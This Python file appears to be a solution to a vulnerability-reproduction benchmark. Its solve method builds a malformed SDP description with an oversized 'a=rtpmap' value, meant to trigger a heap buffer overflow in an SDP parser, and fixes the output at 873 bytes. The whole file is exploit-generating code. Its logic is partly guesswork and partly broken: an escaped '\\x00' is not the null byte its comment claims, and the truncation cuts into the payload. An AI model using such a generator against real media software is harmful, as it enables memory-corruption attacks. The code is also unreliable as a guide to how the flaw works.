import os
import re
import tempfile
import subprocess
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # SDP parser heap buffer overflow PoC
        # Craft malformed SDP with carefully constructed attributes
        # that trigger the out-of-bounds access when parsing values
        
        # Base SDP template
        sdp_template = """v=0
o=- 0 0 IN IP4 127.0.0.1
s=Test Session
c=IN IP4 0.0.0.0
t=0 0
"""
        
        # Craft malicious attribute lines
        # The vulnerability is in parsing attribute values without bounds checking
        # We'll create attributes that cause the parser to read beyond buffer
        
        # Create a long attribute with carefully crafted value
        # that triggers the overflow when parser doesn't check end of value
        
        # First, build up to near buffer boundary
        malicious_attrs = []
        
        # Add padding attributes
        for i in range(10):
            malicious_attrs.append(f"a=test{i}:value{i}")
        
        # The critical part: attribute that triggers the overflow
        # Create a value that causes parser to read beyond allocated buffer
        # Using specific pattern that matches parser's expectations
        
        # Build a value that will cause off-by-one or similar overflow
        overflow_value = b"A" * 500  # Large value
        overflow_value += b":"  # Delimiter that might confuse parser
        overflow_value += b"B" * 200  # More data
        overflow_value += b"\\x00"  # Null byte might terminate early
        overflow_value += b"C" * 150  # Data after null
        
        # Convert to string for SDP
        overflow_str = overflow_value.decode('latin-1')
        
        # Add the malicious attribute
        malicious_attrs.append(f"a=rtpmap:123 {overflow_str}")
        
        # Add more attributes to ensure parsing continues
        for i in range(5):
            malicious_attrs.append(f"a=control:streamid={i}")
        
        # Combine everything
        sdp_content = sdp_template + "\n".join(malicious_attrs)
        
        # Ensure exact length if needed, but we'll use calculated
        poc_bytes = sdp_content.encode('latin-1')
        
        # Trim or pad to match required length (873 bytes)
        target_length = 873
        if len(poc_bytes) > target_length:
            # Truncate strategically - keep the important part
            poc_bytes = poc_bytes[:target_length]
        elif len(poc_bytes) < target_length:
            # Pad with harmless SDP lines
            padding = b"\na=pad:" + b"X" * (target_length - len(poc_bytes) - 7)
            poc_bytes += padding
        
        return poc_bytes[:target_length]
